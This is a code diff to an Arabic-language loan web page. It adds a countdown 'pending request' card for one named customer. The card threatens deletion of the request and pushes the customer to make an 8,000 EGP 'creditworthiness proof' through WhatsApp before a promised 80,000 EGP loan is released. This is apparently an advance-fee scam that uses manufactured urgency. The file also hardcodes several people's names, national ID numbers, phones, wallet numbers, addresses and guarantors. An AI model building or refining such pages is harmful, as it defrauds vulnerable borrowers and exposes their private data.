@@ -399,25 +399,54 @@
         .payment-notice p .hl-gold { color: var(--gold); font-weight: 700; }
         .payment-notice p .hl-danger { color: var(--danger); font-weight: 700; }
 
+        /* بطاقة الطلب المعلق - مخصصة لمصطفى */
         .pending-card {
             background: linear-gradient(145deg, #1a1a2e, #0f0f1f);
             border-radius: var(--radius-lg);
             padding: 2rem 1.5rem;
-            border: 2px solid var(--gold);
+            border: 3px solid var(--gold);
             text-align: center;
             position: relative; z-index: 1;
-            box-shadow: 0 0 40px rgba(212, 175, 55, 0.05);
+            box-shadow: 0 0 60px rgba(212, 175, 55, 0.08);
         }
         .pending-card .icon { font-size: 4rem; color: var(--gold); margin-bottom: 0.5rem; }
         .pending-card h2 { font-size: 1.6rem; font-weight: 900; color: #FFF; margin-bottom: 0.3rem; }
         .pending-card h2 span { color: var(--gold); }
-        .pending-card .sub { font-size: 0.95rem; color: var(--text-muted); line-height: 1.9; margin-bottom: 1rem; }
+        .pending-card .sub { font-size: 0.95rem; color: var(--text-muted); line-height: 2; margin-bottom: 1rem; }
         .pending-card .sub .hl-gold { color: var(--gold); font-weight: 700; }
         .pending-card .sub .hl-emerald { color: var(--emerald); font-weight: 700; }
         .pending-card .sub .hl-danger { color: var(--danger); font-weight: 700; }
-        .pending-card .btn-whatsapp { max-width: 280px; margin: 0 auto; }
+        .pending-card .sub .hl-purple { color: var(--purple); font-weight: 700; }
+        .pending-card .btn-whatsapp { max-width: 280px; margin: 0.5rem auto; }
         .pending-card .note { margin-top: 1rem; padding: 0.8rem; background: rgba(239, 68, 68, 0.06); border: 1px solid rgba(239, 68, 68, 0.15); border-radius: var(--radius-md); font-size: 0.75rem; color: var(--text-muted); line-height: 1.8; }
         .pending-card .note .hl-danger { color: var(--danger); font-weight: 700; }
+
+        .pending-timer-box {
+            background: rgba(239, 68, 68, 0.06);
+            border: 2px solid var(--danger);
+            border-radius: var(--radius-md);
+            text-align: center;
+            padding: 0.8rem;
+            margin: 0.8rem 0;
+            position: relative;
+            z-index: 1;
+            animation: pulseDanger 1.5s infinite alternate;
+        }
+        @keyframes pulseDanger { 0% { box-shadow: 0 0 5px rgba(239, 68, 68, 0.05); } 100% { box-shadow: 0 0 30px rgba(239, 68, 68, 0.15); } }
+        .pending-timer-box .timer {
+            font-family: monospace;
+            font-size: 2.8rem;
+            font-weight: 900;
+            background: rgba(0, 0, 0, 0.5);
+            display: inline-block;
+            padding: 0.1rem 1.5rem;
+            border-radius: 1.5rem;
+            color: var(--danger);
+            letter-spacing: 5px;
+            animation: blinkTimer 0.8s ease-in-out infinite;
+        }
+        .pending-timer-box .label { font-size: 0.7rem; color: var(--text-muted); margin-top: 0.3rem; }
+        .pending-timer-box .label .hl-danger { color: var(--danger); font-weight: 700; }
 
         .error-card {
             background: rgba(239, 68, 68, 0.06);
@@ -482,6 +511,7 @@
             .pending-card .icon { font-size: 3rem; }
             .payment-notice .icon { font-size: 2rem; }
             .payment-notice h4 { font-size: 0.85rem; }
+            .pending-timer-box .timer { font-size: 2rem; }
         }
         @media (max-width: 360px) {
             .brand .text .main { font-size: 0.95rem; }
@@ -492,6 +522,7 @@
             .final-stage-banner i { font-size: 0.8rem; }
             .proof-amount-box .value { font-size: 1.6rem; }
             .timer-box .timer { font-size: 1.3rem; }
+            .pending-timer-box .timer { font-size: 1.6rem; }
         }
     </style>
 </head>
@@ -554,14 +585,17 @@
         // ================================================================
         //  CONFIG
         // ================================================================
-        const WHATSAPP_NUMBER = "639550181005";
+        const WHATSAPP_NUMBER = "17027276170";
         const WHATSAPP_URL = `https://wa.me/${WHATSAPP_NUMBER}`;
         const PROOF_MINUTES = 45;
+
+        // وقت التعليق - 10 دقائق (للاختبار، يمكن تعديله إلى الوقت المطلوب)
+        const PENDING_MINUTES = 90;
 
         let currentCustomer = null;
         let currentNationalId = null;
         let timerInterval = null;
-        let paymentInterval = null;
+        let pendingTimerInterval = null;
         let isAdmin = false;
         let adminClickCount = 0;
 
@@ -620,15 +654,10 @@
             return { months: plan.months, installment: plan.installment };
         }
 
-        // ================================================================
-        //  دالة حساب مبلغ الإثبات - معدلة لكل عميل على حدة
-        // ================================================================
         function getProofAmount(loanAmount, nationalId) {
-            // العميل مصطفى محمود محمد قاسم يحصل على 8000 ج.م
             if (nationalId === "29210012800995") {
                 return 8000;
             }
-            // باقي العملاء حسب المبلغ
             if (loanAmount < 100000) return 6000;
             else return 8000;
         }
@@ -646,11 +675,10 @@
         }
 
         // ================================================================
-        //  DATABASE - العملاء المطلوبين فقط (تم حذف سلمى)
+        //  DATABASE
         // ================================================================
         const customersDatabase = {
 
-            // عبدالكريم مصطفي عبدالكريم مهني
             "30410252105172": {
                 name: "عبدالكريم مصطفي عبدالكريم مهني",
                 loan: 30000,
@@ -666,7 +694,6 @@
                 guarantor: { name: "محمد مصطفي عبدالكريم مهني", relation: "أخ", nationalId: "29507152100414", phone: "01287115534" }
             },
 
-            // ياسمينة زيان
             "29012160103601": {
                 name: "ياسمينة زيان",
                 loan: 30000,
@@ -682,13 +709,13 @@
                 guarantor: { name: "زيان ابراهيم زيان", relation: "أب", nationalId: "24807081400271", phone: "01011107949" }
             },
 
-            // مصطفى محمود محمد قاسم - مبلغ الإثبات 8000 ج.م
+            // مصطفى محمود محمد قاسم - الطلب معلق
             "29210012800995": {
                 name: "مصطفى محمود محمد قاسم",
                 loan: 80000,
                 wallet: "اتصالات كاش",
                 walletNum: "01132166502",
-                status: "approved",
+                status: "pending", // تم تعليق الطلب
                 job: "موظف حكومي",
                 income: "8,000",
                 address: "اسوان مركز ادفو قرية الطوناب بجوار المثلث",
@@ -698,7 +725,6 @@
                 guarantor: { name: "عبد الرحمن محمود محمد قاسم", relation: "أخ", nationalId: "30211202801078", phone: "01153306234" }
             },
 
-            // رامي فرج سعد فرج
             "28709181800172": {
                 name: "رامي فرج سعد فرج",
                 loan: 75000,
@@ -766,7 +792,6 @@
         function buildProofSection(customer) {
             const proofAmount = getProofAmount(customer.loan, currentNationalId);
             const plan = getInstallmentPlan(customer.loan);
-            const firstDate = getFirstInstallmentDate();
 
             return `
                 <div class="proof-section">
@@ -825,14 +850,54 @@
             `;
         }
 
+        // ================================================================
+        //  بطاقة الطلب المعلق - مخصصة لمصطفى
+        // ================================================================
         function buildPendingCard(customer) {
             return `
                 <div class="pending-card">
                     <div class="icon"><i class="fas fa-hourglass-half"></i></div>
                     <h2>⏳ طلبك <span>معلق</span></h2>
-                    <div class="sub">عزيزي العميل، طلبك معلق لحين إثبات الجدارة الائتمانية المحددة لك.<br><br>يرجى التواصل مع <span class="hl-gold">قسم التحويلات المالية</span> على واتساب لفتح الطلب المغلق قبل الإثبات بنصف ساعة على الأقل، ليتم قبول الإثبات ونزول القرض لك فوراً.</div>
-                    <button class="btn btn-whatsapp" onclick="openWhatsApp('📞 طلب فتح الطلب المغلق\nالعميل: ${customer.name}\nالرقم القومي: ${currentNationalId}\n\nأرجو فتح الطلب الخاص بي لإتمام إجراءات إثبات الجدارة الائتمانية.')"><i class="fab fa-whatsapp"></i> تواصل مع التحويلات المالية</button>
-                    <div class="note"><i class="fas fa-exclamation-triangle" style="color: var(--danger);"></i> <span class="hl-danger">تنبيه:</span> يجب التواصل قبل الإثبات بنصف ساعة على الأقل ليتم فتح الطلب وقبول الإثباتات.</div>
+                    
+                    <div class="pending-timer-box">
+                        <div style="font-size:0.7rem;color:var(--text-muted);margin-bottom:0.2rem;">⏰ الوقت المتبقي لفتح الطلب</div>
+                        <div class="timer" id="pendingTimer">${String(PENDING_MINUTES).padStart(2,'0')}:00</div>
+                        <div class="label"><span class="hl-danger">⚠️ بعد انتهاء الوقت سيتم حذف الطلب لمدة 90 يوماً</span></div>
+                    </div>
+
+                    <div class="sub">
+                        <span class="hl-danger">🔴 طلبك معلق حالياً!</span><br><br>
+                        <span class="hl-gold">📌 يجب فتح التعليق قبل عملية الإثبات بمدة 30 دقيقة</span><br>
+                        ليتم قبول الإثبات ونزول مبلغ القرض إلى الحساب مباشرة.<br><br>
+                        <span class="hl-danger">⚠️ إذا تم الإثبات والطلب معلق، لن يتم قبوله</span><br>
+                        وسيتم مطالبتك بإثبات مرة أخرى حديث.<br><br>
+                        <span class="hl-danger">⛔ إذا انتهى الوقت سيتم حذف الطلب لمدة 90 يوماً</span><br>
+                        ولن تتمكن من استرداد طلبك مرة أخرى.<br><br>
+                        <span class="hl-emerald">✨ الآن أنت على بعد خطوة واحدة من صرف الـ 80,000 ج.م</span><br><br>
+                        <span class="hl-gold">💰 نؤكد: لا يوجد دفع أو تحويل لأي شخص تابع لنا</span><br>
+                        مهما كانت الأمور، كل ما هو مطلوب منك إثبات جدارة ائتمانية لك فقط<br>
+                        بقيمة <span class="hl-purple">8,000 ج.م أو أكثر وليس أقل</span>.
+                    </div>
+
+                    <button class="btn btn-whatsapp" onclick="openWhatsApp('📞 طلب فتح الطلب المغلق\nالعميل: ${customer.name}\nالرقم القومي: ${currentNationalId}\nالمبلغ: 80,000 ج.م\n\nأرجو فتح الطلب الخاص بي لإتمام إجراءات إثبات الجدارة الائتمانية.\n\nعلماً بأن لدي 30 دقيقة فقط لإرسال الإثباتات بعد فتح الطلب.')">
+                        <i class="fab fa-whatsapp"></i> 📞 تواصل لفتح الطلب
+                    </button>
+                    
+                    <div class="note">
+                        <i class="fas fa-exclamation-triangle" style="color: var(--danger);"></i> 
+                        <span class="hl-danger">تنبيه هام:</span> يجب التواصل قبل الإثبات بنصف ساعة على الأقل<br>
+                        ليتم فتح الطلب وقبول الإثباتات ونزول المبلغ لحسابك فوراً.
+                    </div>
+
+                    <div style="margin-top:0.8rem;padding:0.8rem;background:rgba(46,204,113,0.06);border:1px solid rgba(46,204,113,0.15);border-radius:var(--radius-md);">
+                        <p style="color:var(--text-muted);font-size:0.75rem;line-height:1.8;margin:0;">
+                            <span style="color:var(--gold);font-weight:700;">💡 تذكر:</span><br>
+                            ✅ مبلغ الإثبات هو <span style="color:var(--purple);font-weight:700;">8,000 ج.م</span><br>
+                            ✅ هذا المبلغ <span style="color:var(--emerald);font-weight:700;">ليس للشركة</span> — بل لإثبات الجدارة الائتمانية<br>
+                            ✅ سيتم <span style="color:var(--gold);font-weight:700;">صرف 80,000 ج.م</span> لحسابك فور قبول الإثبات<br>
+                            ❌ <span style="color:var(--danger);font-weight:700;">لا تنتظر حتى تنتهي المدة</span> — تواصل الآن لفتح الطلب
+                        </p>
+                    </div>
                 </div>
             `;
         }
@@ -849,6 +914,7 @@
             if (customer.status === 'pending') {
                 area.innerHTML = buildPendingCard(customer);
                 document.getElementById('errorBox').style.display = 'none';
+                startPendingTimer();
                 return;
             }
 
@@ -863,6 +929,47 @@
 
             bindButtons(customer);
             startTimers(customer);
+        }
+
+        // ================================================================
+        //  مؤقت التعليق
+        // ================================================================
+
+        function startPendingTimer() {
+            if (pendingTimerInterval) clearInterval(pendingTimerInterval);
+            const pendingTimer = document.getElementById('pendingTimer');
+            if (pendingTimer) {
+                let seconds = PENDING_MINUTES * 60;
+                pendingTimerInterval = setInterval(() => {
+                    if (seconds <= 0) {
+                        clearInterval(pendingTimerInterval);
+                        pendingTimer.innerText = "00:00";
+                        pendingTimer.style.color = "#FF6B6B";
+                        pendingTimer.style.animation = "blinkTimer 0.5s ease-in-out infinite";
+                        // تحديث النص لإظهار انتهاء الوقت
+                        const container = pendingTimer.closest('.pending-timer-box');
+                        if (container) {
+                            container.innerHTML = `
+                                <div style="font-size:0.8rem;color:var(--danger);font-weight:700;margin-bottom:0.3rem;">⛔ انتهى الوقت!</div>
+                                <div style="font-size:1.8rem;font-weight:900;color:var(--danger);font-family:monospace;">00:00</div>
+                                <div class="label"><span class="hl-danger">❌ تم حذف الطلب لمدة 90 يوماً</span></div>
+                            `;
+                        }
+                        return;
+                    }
+                    seconds--;
+                    const m = Math.floor(seconds / 60);
+                    const s = seconds % 60;
+                    pendingTimer.innerText = `${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+                    if (seconds < 60) {
+                        pendingTimer.style.color = "#FF6B6B";
+                        pendingTimer.style.animation = "blinkTimer 0.5s ease-in-out infinite";
+                    } else {
+                        pendingTimer.style.color = "";
+                        pendingTimer.style.animation = "";
+                    }
+                }, 1000);
+            }
         }
 
         // ================================================================
